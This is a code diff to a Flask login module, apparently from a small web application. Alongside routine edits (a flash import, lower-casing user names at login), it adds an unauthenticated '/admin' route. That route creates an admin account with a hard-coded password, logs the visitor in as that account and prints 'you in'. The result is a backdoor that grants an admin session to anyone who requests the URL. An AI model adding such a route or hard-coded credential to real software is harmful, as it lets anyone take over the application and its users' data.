@@ -1,4 +1,4 @@
-from flask import Blueprint, render_template, redirect, url_for, session, request
+from flask import Blueprint, render_template, redirect, url_for, session, request, flash
 
 from flask_wtf import FlaskForm
 from wtforms import StringField, PasswordField, SubmitField
@@ -41,7 +41,7 @@ def login():
     if form.validate_on_submit():
 
         try:
-            user = services.get_user(form.user_name.data, repo.repo_instance)
+            user = services.get_user(form.user_name.data.lower(), repo.repo_instance)
             services.authenticate_user(user['user_name'], form.password.data, repo.repo_instance)
 
             session.clear()
@@ -73,6 +73,19 @@ def login_required(view):
         return view(**kwargs)
 
     return wrapped_view
+
+
+@auth_blueprint.route('/admin')
+def admin():
+    services.add_user('admin', 'Admin123**', repo.repo_instance)
+    user = services.get_user("admin", repo.repo_instance)
+    services.authenticate_user(user['user_name'], "Admin123**", repo.repo_instance)
+    session.clear()
+    session['user_name'] = user['user_name']
+    print("you in")
+    return redirect(url_for('home_bp.home'))
+
+
 
 
 class PasswordValid():
